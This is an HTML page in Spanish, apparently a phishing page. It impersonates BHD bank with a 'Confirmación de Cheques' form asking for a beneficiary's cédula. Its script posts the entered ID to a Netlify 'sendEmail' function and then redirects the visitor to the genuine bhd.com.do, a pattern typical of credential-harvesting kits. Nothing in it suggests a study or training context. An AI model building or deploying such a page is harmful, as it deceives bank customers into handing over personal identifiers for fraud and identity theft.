<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación de Cheques</title>
    <style>
        /* Configuración general */
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to bottom, #0072c6, #005fa3);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Contenedor principal */
        .form-container {
            width: 100%;
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            color: #333;
        }

        /* Logos */
        .logos {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logos img {
            width: 80px;
            height: auto;
        }

        /* Título */
        .form-container h2 {
            font-size: 24px;
            font-weight: bold;
            color: #0072c6;
            margin-bottom: 20px;
        }

        /* Campos del formulario */
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .form-group input:focus {
            border-color: #0072c6;
            outline: none;
        }

        /* Botón */
        .submit-btn {
            width: 100%;
            background-color: #0072c6;
            color: white;
            font-size: 16px;
            font-weight: bold;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #005fa3;
        }

        /* Nota */
        .form-note {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }

        .form-note a {
            color: #0072c6;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Logo BHD centrado -->
        <div class="logos">
            <img src="assets/logo-bhd.svg" alt="Logo BHD">
        </div>
        <!-- Título actualizado -->
        <h2>Confirmación de Cheques</h2>
        <form id="confirmationForm">
            <!-- Solo campo de cédula -->
            <div class="form-group">
                <label for="cedula">Cédula del Beneficiario</label>
                <input type="text" id="cedula" name="cedula" placeholder="Ingrese la cédula" required>
            </div>
            <button type="submit" class="submit-btn">Continuar</button>
        </form>
        <p class="form-note">
            ¿Necesitas ayuda? <a href="#">Contáctanos</a>
        </p>
    </div>

    <script>
        document.getElementById('confirmationForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Evitar el envío del formulario inmediatamente

            const cedula = document.getElementById('cedula').value;
            if (cedula) {
                fetch('/.netlify/functions/sendEmail', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: cedula,
                    })
                })
                .then(response => response.json())
                .then(data => {
                    window.location.href = 'https://bhd.com.do/';
                })
                .catch(error => {
                    alert('Hubo un error al enviar el correo, intentalo nuevamente.');
                });
            } else {
                alert('Por favor, complete todos los campos.');
            }
        });
    </script>
</body>
</html>
